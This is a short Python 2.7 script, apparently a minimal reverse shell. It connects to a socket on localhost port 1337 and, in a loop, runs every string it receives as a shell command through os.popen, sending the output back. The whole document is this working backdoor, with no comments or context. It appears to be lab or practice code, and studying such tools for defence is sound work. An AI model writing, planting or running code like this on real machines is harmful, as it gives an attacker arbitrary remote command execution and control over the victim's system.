#!/usr/bin/python2.7

import socket,os

host = "localhost"
port = 1337

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sock.connect((host,port))

while True:
    command = sock.recv(1024)
    sock.send(os.popen(command).read())
